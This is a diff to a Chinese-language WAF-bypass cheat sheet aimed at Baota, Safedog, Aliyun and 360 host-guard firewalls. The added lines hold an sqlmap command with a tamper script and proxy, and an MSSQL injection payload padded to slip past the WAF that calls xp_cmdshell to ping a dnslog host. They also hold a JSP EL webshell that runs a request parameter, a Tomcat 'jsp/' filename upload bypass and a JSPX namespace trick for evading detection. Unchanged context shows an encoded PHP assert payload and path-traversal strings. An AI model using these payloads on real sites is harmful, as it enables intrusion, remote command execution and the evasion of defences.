@@ -13,14 +13,22 @@ BT(baota)-awvs+xray漏扫Payload绕过延时被动
 
 ## SQI注入
 
-如需sq1map注入修改us头及加入代理防cc拦截自写tamper模块
+如需sqlmap注入修改us头及加入代理防cc拦截自写tamper模块
 安全狗:参考之前payload
 Aliyun:基本修改指纹即可
 宝塔:匹配关键字外加/+等
 
 ```
-sq1map --proxy="http://127.0.0.1:8080" --tamper="waf.py" --random-agent
+sqlmap --proxy="http://127.0.0.1:8080" --tamper="waf.py" --random-agent
 ```
+
+360主机卫士是一个很老的WAF，也早已停止更新，所以绕起来不是很难，这里直接使用师傅发的Payload通过dnslog方式来测试是否可以正常执行命令
+
+```
+'+and+(select+1)=(Select+0xAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA)+exec+master..xp_cmdshell+'ping+******.dnslog.cn';*--*
+```
+
+
 
 ## 文件上传
 
@@ -46,10 +54,51 @@ p
 h
 p
 "
-
 ```
 
+tomcat系列
 
+1、后缀名
+
+在后缀名绕过那里可以绕过是因为`tomcat`认为`.jsp/`在文件名中是非法的，`Tomcat`会自动去除非法的`/`号，并不是因为`windows`的特性。但`.jsp\`的反斜杠在本地测试时也可以正常解析去除，在目标机上却无法解析，个人感觉应该很大程度取决于所用的java库及其版本
+
+```
+filename=jsp/
+```
+
+2、内容绕过
+
+所以我们得绕过`JSP标记`检测，这里两种绕过方法。
+
+- jspEL表达式绕过
+
+- jspx命名空间绕过
+
+- **第一种是利用${}标记：**
+
+  payload：
+
+  ```
+  ${Runtime.getRuntime().exec(request.getParameter("x"))}
+  ```
+
+**第二种是利用命名空间的特性：**
+
+参照yzddmr6师傅的图：
+
+![图片](https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOcwBT53V11MO0kgwBDTnYPWwGQOG8dfR7UwficDMoU8mGAV9cdo7VZfYYu25u8rnHtrzSpdGNP9czQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1)
+
+
+
+使用自定义的命名空间，替换掉`jsp`的关键字，将原本的`<jsp:scriptlet>`替换成`<自定义字符:scriptlet>`，这样waf的正则匹配不到`<jsp:scriptlet>`自然就会放行
+
+```xml
+<hi xmlns:hi="http://java.sun.com/JSP/Page">
+	<hi:scriptlet>
+		out.println(30*30);
+	</hi:scriptlet>
+</hi>
+```
 
 ## Xss跨站
 
@@ -75,3 +124,6 @@ txt=$hex='706870696e666f28293b jassert(pack("H*". $hex));&usubmit=9E6%8F%90%6E4%
 ..\   ..../   ..\.\ 等
 ```
 
+## 宝塔waf绕过
+
+https://mp.weixin.qq.com/s/-tenIIgbhXa-T331V5Je1g
